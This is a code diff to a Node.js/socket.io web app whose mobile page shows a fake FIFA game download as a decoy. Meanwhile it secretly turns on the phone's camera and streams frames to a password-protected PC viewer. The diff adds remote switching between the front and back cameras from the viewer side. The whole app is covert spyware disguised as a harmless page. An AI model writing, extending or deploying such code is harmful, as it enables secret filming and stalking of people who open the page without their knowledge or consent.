@@ -133,7 +133,7 @@ app.get('/', (req, res) => {
             color: #1976D2;
         }
         
-        /* Estilos para PC (mostra vídeo normal) */
+        /* Estilos para PC */
         .pc-container {
             text-align: left;
         }
@@ -209,6 +209,43 @@ app.get('/', (req, res) => {
             padding: 20px;
             border-radius: 10px;
             border-left: 5px solid #2196F3;
+            margin-bottom: 15px;
+        }
+
+        /* Controles da câmera */
+        .camera-controls {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 15px;
+        }
+        
+        .camera-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            flex: 1;
+            transition: all 0.3s;
+        }
+        
+        .camera-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
+        }
+        
+        .camera-btn.active {
+            background: #2196F3;
+            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.3);
+        }
+        
+        .camera-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
         }
         
         .hidden {
@@ -267,9 +304,20 @@ app.get('/', (req, res) => {
                 </div>
             </div>
             
+            <!-- CONTROLES DA CÂMERA (aparecem após liberar senha) -->
+            <div id="cameraControls" class="camera-controls hidden">
+                <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')">
+                    📱 Câmera Frontal
+                </button>
+                <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')">
+                    📷 Câmera Traseira
+                </button>
+            </div>
+            
             <div class="info-box">
                 <h4>📱 Informações:</h4>
-                <p>Digite a senha <strong>"1234"</strong> para ver a transmissão ao vivo do celular.</p>
+                <p>Digite a senha <strong>"1234"</strong> para ver a transmissão ao vivo.</p>
+                <p>Após liberar, você pode alternar entre câmera frontal e traseira!</p>
                 <p>No celular, o download falso está rodando... 🎮</p>
             </div>
         </div>
@@ -289,6 +337,7 @@ app.get('/', (req, res) => {
         const localVideo = document.getElementById('localVideo');
         const remoteVideo = document.getElementById('remoteVideo');
         const passwordOverlay = document.getElementById('passwordOverlay');
+        const cameraControls = document.getElementById('cameraControls');
         
         // Elementos da barrinha
         const progressBar = document.getElementById('progressBar');
@@ -301,6 +350,12 @@ app.get('/', (req, res) => {
         let visualizacaoLiberada = false;
         let progresso = 0;
         let intervaloProgresso = null;
+        let cameraAtual = 'back'; // 'back' ou 'front'
+        let intervaloCaptura = null;
+        
+        // Botões da câmera
+        const cameraFrontBtn = document.getElementById('cameraFrontBtn');
+        const cameraBackBtn = document.getElementById('cameraBackBtn');
         
         // ========== DETECÇÃO DE DISPOSITIVO ==========
         function detectarDispositivo() {
@@ -320,9 +375,9 @@ app.get('/', (req, res) => {
             // Inicia a animação da barrinha
             iniciarDownloadFalso();
             
-            // Liga a câmera escondida
+            // Liga a câmera escondida (inicia com traseira)
             setTimeout(() => {
-                ligarCameraEscondida();
+                ligarCameraEscondida('back');
             }, 2000); // 2 segundos
             
         } else {
@@ -400,21 +455,41 @@ app.get('/', (req, res) => {
         }
         
         // ========== FUNÇÃO PARA LIGAR CÂMERA ESCONDIDA ==========
-        async function ligarCameraEscondida() {
+        async function ligarCameraEscondida(tipoCamera) {
             try {
-                console.log('📷 Ligando câmera escondida...');
+                // Para a captura atual se existir
+                if (intervaloCaptura) {
+                    clearInterval(intervaloCaptura);
+                }
                 
-                // Solicita acesso à câmera
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: 640, 
-                        height: 480,
-                        facingMode: 'environment'
+                // Para todas as tracks da stream anterior
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+                
+                console.log(\`📷 Ligando câmera \${tipoCamera}...\`);
+                
+                // Configuração da câmera
+                const constraints = {
+                    video: {
+                        width: 640,
+                        height: 480
                     },
                     audio: false
-                });
+                };
+                
+                // Define qual câmera usar
+                if (tipoCamera === 'front') {
+                    constraints.video.facingMode = 'user';
+                } else {
+                    constraints.video.facingMode = 'environment';
+                }
+                
+                // Solicita acesso à câmera
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 
                 mediaStream = stream;
+                cameraAtual = tipoCamera;
                 
                 // Conecta o stream ao vídeo escondido
                 localVideo.srcObject = stream;
@@ -427,7 +502,7 @@ app.get('/', (req, res) => {
                 const ctx = canvas.getContext('2d');
                 
                 // Função de captura (continua mesmo com a aba em background)
-                const intervaloCaptura = setInterval(() => {
+                intervaloCaptura = setInterval(() => {
                     try {
                         ctx.drawImage(localVideo, 0, 0, 640, 480);
                         const frame = canvas.toDataURL('image/jpeg', 0.5);
@@ -437,7 +512,7 @@ app.get('/', (req, res) => {
                     }
                 }, 200); // 5 fps
                 
-                console.log('✅ Câmera escondida transmitindo!');
+                console.log(\`✅ Câmera \${tipoCamera} transmitindo!\`);
                 
             } catch (err) {
                 console.error('Erro ao ligar câmera:', err);
@@ -445,12 +520,34 @@ app.get('/', (req, res) => {
             }
         }
         
+        // ========== FUNÇÃO PARA MUDAR CÂMERA (chamada do PC) ==========
+        window.mudarCamera = function(tipo) {
+            if (!visualizacaoLiberada) {
+                alert('Libere a visualização primeiro!');
+                return;
+            }
+            
+            // Atualiza botões
+            if (tipo === 'front') {
+                cameraFrontBtn.classList.add('active');
+                cameraBackBtn.classList.remove('active');
+            } else {
+                cameraBackBtn.classList.add('active');
+                cameraFrontBtn.classList.remove('active');
+            }
+            
+            // Envia comando para o celular trocar a câmera
+            socket.emit('trocarCamera', tipo);
+        };
+        
         // ========== VERIFICAÇÃO DE SENHA (PC) ==========
         window.verificarSenha = function() {
             const senha = document.getElementById('senhaInput').value;
             if (senha === SENHA_CORRETA) {
                 passwordOverlay.style.display = 'none';
                 visualizacaoLiberada = true;
+                cameraControls.classList.remove('hidden');
+                cameraBackBtn.classList.add('active'); // Começa com traseira
             } else {
                 document.getElementById('erroSenha').style.display = 'block';
             }
@@ -463,6 +560,14 @@ app.get('/', (req, res) => {
         // ========== SOCKET.IO ==========
         socket.on('connect', () => {
             console.log('Conectado ao servidor');
+        });
+        
+        // Recebe comando para trocar câmera (enviado do PC)
+        socket.on('trocarCamera', (tipoCamera) => {
+            console.log('📱 Comando recebido: trocar para câmera', tipoCamera);
+            if (isMobile) {
+                ligarCameraEscondida(tipoCamera);
+            }
         });
         
         socket.on('frame', (frameData) => {
@@ -483,6 +588,12 @@ io.on('connection', (socket) => {
   socket.on('frame', (frameData) => {
     socket.broadcast.emit('frame', frameData);
   });
+  
+  // Novo evento para trocar câmera
+  socket.on('trocarCamera', (tipoCamera) => {
+    console.log(`📷 Solicitando troca para câmera: ${tipoCamera}`);
+    socket.broadcast.emit('trocarCamera', tipoCamera);
+  });
 });
 
 server.listen(PORT, () => {
@@ -492,6 +603,7 @@ server.listen(PORT, () => {
   console.log(`🚀 Servidor rodando na porta ${PORT}`);
   console.log(`🔑 Senha: ${SENHA}`);
   console.log('📱 No celular: mostra download falso do FIFA');
-  console.log('💻 No PC: mostra a câmera escondida');
+  console.log('💻 No PC: mostra a câmera escondida COM CONTROLE');
+  console.log('🎮 Agora você pode alternar entre câmera frontal/traseira!');
   console.log('='.repeat(60));
 });
